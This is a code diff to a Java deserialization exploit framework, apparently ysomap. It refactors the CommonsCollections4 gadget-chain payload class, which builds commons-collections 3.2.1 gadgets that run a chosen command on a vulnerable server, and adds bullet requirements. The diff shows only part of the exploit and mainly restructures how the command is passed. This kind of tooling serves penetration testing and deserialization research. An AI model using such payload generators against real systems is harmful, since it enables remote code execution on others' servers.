@@ -5,8 +5,10 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
+import ysomap.annotation.Require;
 import ysomap.exception.GenerateErrorException;
 import ysomap.gadget.ObjectGadget;
+import ysomap.gadget.bullet.Bullet;
 import ysomap.gadget.bullet.collections.TransformerBullet;
 import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
@@ -49,6 +51,7 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
  */
 @SuppressWarnings({"rawtypes"})
 @Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
+@Require(bullets = {"TransformerBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
 @Dependencies({"commons-collections:commons-collections:3.2.1, without security manager"})
 public class CommonsCollections4 extends Payload<BadAttributeValueExpException>{
 
@@ -83,8 +86,11 @@ public class CommonsCollections4 extends Payload<BadAttributeValueExpException>{
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TransformerBullet(command, "3");
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        Bullet bullet = new TransformerBullet();
+        bullet.set("args", command);
+        bullet.set("version", "3");
+        return bullet;
     }
 
     public static void main(String[] args) throws GenerateErrorException {
